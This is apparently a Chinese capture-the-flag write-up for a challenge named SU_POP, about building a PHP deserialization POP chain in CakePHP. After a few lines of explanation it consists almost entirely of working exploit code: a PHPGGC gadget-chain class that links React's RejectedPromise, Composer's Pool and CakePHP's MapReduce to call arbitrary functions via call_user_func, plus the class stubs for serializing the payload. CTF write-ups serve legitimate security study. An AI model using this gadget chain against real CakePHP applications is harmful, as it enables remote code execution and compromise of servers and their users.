# SU_POP

## 题解

想出个框架的POP链挖掘的题，就打开PHPGGC 发现cakephp 好久没更新，就顺手挖一下

我看了一下大家的WP，入口点都是一样的RejectedPromise class

在这里我也贴一下自己的payload

参考：https://forum.butian.net/share/2411

```PHP
<?php

namespace GadgetChain\CakePHP;


class RCE7 extends \PHPGGC\GadgetChain\RCE\FunctionCall
{
    public static $version = 'new';
    public static $vector = '__destruct';
    public static $author = 'shukuang';

    public function generate(array $parameters)
    {
        $a = [$parameters["parameter"] => $parameters["function"]];
        $b = new \Cake\Collection\Iterator\MapReduce(false, "call_user_func", $a);
        $c = new \Composer\DependencyResolver\Pool($b);
        $d = new \React\Promise\Internal\RejectedPromise($c);
        return $d;
    }
}
```

```PHP
<?php

namespace Seld\Signal {
    final class SignalHandler
    {
        private $signals;

        public function __construct($signals)
        {
            $this->signals = $signals;
        }
    }
}


namespace Cake\Collection\Iterator {

    class MapReduce
    {
        protected bool $_executed;
        protected $_mapper;
        protected iterable $_data;

        public function __construct($_executed, $mapper, $_data)
        {
            $this->_executed = $_executed;
            $this->_mapper = $mapper;
            $this->_data = $_data;
        }
    }
}

namespace Composer\DependencyResolver {
    class Pool
    {
        protected $packages;

        public function __construct($packages)
        {
            $this->packages = $packages;
        }
    }
}


namespace React\Promise\Internal {
    class RejectedPromise
    {
        private $handled;
        private $reason;

        public function __construct($reason)
        {
            $this->handled = false;
            $this->reason = $reason;
        }
    }
}
```
